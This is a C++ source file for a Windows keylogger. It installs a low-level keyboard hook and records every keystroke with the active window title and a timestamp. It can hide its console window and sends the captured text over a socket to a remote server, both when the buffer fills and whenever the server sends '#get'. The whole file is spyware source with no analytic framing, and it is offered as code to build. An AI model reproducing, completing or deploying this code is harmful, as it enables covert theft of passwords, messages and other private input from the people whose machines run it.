#include <winsock2.h>

#include <Windows.h>
#include <stdio.h>
#include <time.h>
#include <process.h>
#include <winsock2.h>
#include <cstdio>
#include <fstream>
#include <iostream>

// defines whether the window is visible or not
#define BUFFERSIZE 1000

// variable to store the HANDLE to the hook. Don't declare it anywhere else then
// globally or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in
// the callback function it contains the thing you will need: vkCode = virtual
// key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream OUTPUT_FILE;

extern char lastwindow[256];

int ServerConnect(SOCKET &sockfd);
char KeyMapping(char key);
void ServerMessage(void *p);
SOCKET sockfd;
char message[BUFFERSIZE];

// This is the callback function. Consider it the event that is raised when, in
// this case, a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0) {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN) {
            // lParam is the pointer to the struct containing the data needed,
            // so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT *) lParam);

            // save to file
            Save(kbdStruct.vkCode);
        }
    }

    // call the next hook in the hook chain. This is nessecary or your hook
    // chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More
    // information about it at MSDN. The last 2 parameters are NULL, 0 because
    // the callback function is in the same thread and window as the function
    // that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    char lastwindow[256];

    if ((key_stroke == 1) || (key_stroke == 2))
        return 0;  // ignore mouse clicks

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout;
    if (foreground) {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground) {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);

        if (strcmp(window_title, lastwindow) != 0) {
            strcpy(lastwindow, window_title);

            // get time
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);


            strcat(message, "[Window: ");
            strcat(message, window_title);
            strcat(message, " - at ");
            strcat(message, s);
            strcat(message, "]\n\n");
        }
    }


    std::cout << key_stroke << '\n';

    if (key_stroke == VK_BACK) {
        strcat(message, "[###BACKSPACE]");
    } else if (key_stroke == VK_RETURN) {
        strcat(message, "\n");
    } else if (key_stroke == VK_SPACE) {
        strcat(message, " ");
    } else if (key_stroke == VK_TAB) {
        strcat(message, "\t");
    } else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT ||
               key_stroke == VK_RSHIFT) {
        //strcat(message, "[###SHIFT]");
    } else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL ||
               key_stroke == VK_RCONTROL) {
        strcat(message, "[###CTRL]");
    } else if (key_stroke == VK_ESCAPE) {
        strcat(message, "[###ESCAPE]");
    } else if (key_stroke == VK_END) {
        strcat(message, "[###END]");
    } else if (key_stroke == VK_HOME) {
        strcat(message, "[###HOME]");
    } else if (key_stroke == VK_LEFT) {
        strcat(message, "[###LEFT]");
    } else if (key_stroke == VK_UP) {
        strcat(message, "[###UP]");
    } else if (key_stroke == VK_RIGHT) {
        strcat(message, "[###RIGHT]");
    } else if (key_stroke == VK_DOWN) {
        strcat(message, "[###DOWN]");
    } else if (key_stroke == 190 || key_stroke == 110) {
        strcat(message, ".");
    } else if (key_stroke == 189 || key_stroke == 109) {
        strcat(message, "-");
    } else if (key_stroke == 20) {
        //strcat(message, "[###CAPSLOCK]");
    } else {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase){
            //沒按Shift
            if(key >= 65 && key <= 90){
                key = tolower(key);
            }
        }
        else {
            //有按Shift
            key = KeyMapping(key);
        }


        char buf[2] = {key, 0x00};
        strcat(message, buf);
    }

    if(strlen(message) > BUFFERSIZE - 50){
        send(sockfd, message, BUFFERSIZE, 0);
        strcpy(message, "");
    }


    return 0;
}

char KeyMapping(char key){
    char keymap[20][2] = {
        {'`', '~'},
        {'1', '!'},
        {'2', '@'},
        {'3', '#'},
        {'4', '$'},
        {'5', '%'},
        {'6', '^'},
        {'7', '&'},
        {'8', '*'},
        {'9', '('},
        {'0', ')'},
        {'-', '_'},
        {'=', '+'},
        {'[', '{'},
        {'\\', '|'},
        {';', ':'},
        {'\'', '"'},
        {',', '<'},
        {'.', '>'},
        {'/', '?'}
    };


    for(int i = 0; i < 20; i++){
        if(key == keymap[i][0]){
            return keymap[i][1];
        }
    }

    return key;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);  // visible window
#endif                                                       // visible

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);  // invisible window
#endif                                                       // invisible
}

int ServerConnect(SOCKET &sockfd)
{
    int result;
    struct sockaddr_in address;
    int len;
    WSADATA wsadata;

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(SERVER_IP);
    address.sin_port = PORT;
    len = sizeof(address);

    if (WSAStartup(0x101, (LPWSADATA) &wsadata) != 0) {
        printf("Winsock Error\n");
        exit(1);
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    result = connect(sockfd, (struct sockaddr *) &address, len);
    if (result == -1) {
        printf("Connect Error");
        return -1;
    } else {
        return 0;
    }
}

void ServerMessage(void *p){
    int rVal;
    char buf[BUFFERSIZE + 1];

    while ((rVal = recv(sockfd, buf, BUFFERSIZE, 0)) > 0) {
        buf[rVal] = 0x00;
        if(strcmp(buf, "#get") == 0){
            send(sockfd, message, BUFFERSIZE, 0);
            strcpy(message, "");
        }
    }
}

int main()
{
    // open output file in append mode
    //OUTPUT_FILE.open(".System32Log.txt", std::ios_base::app);

    // visibility of window
    Stealth();

    // Connect to server
    ServerConnect(sockfd);

    // Get message from Server
    _beginthread(ServerMessage, 0, NULL);

    // Set the hook
    SetHook();


    // loop to keep the console application running.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
    }
}
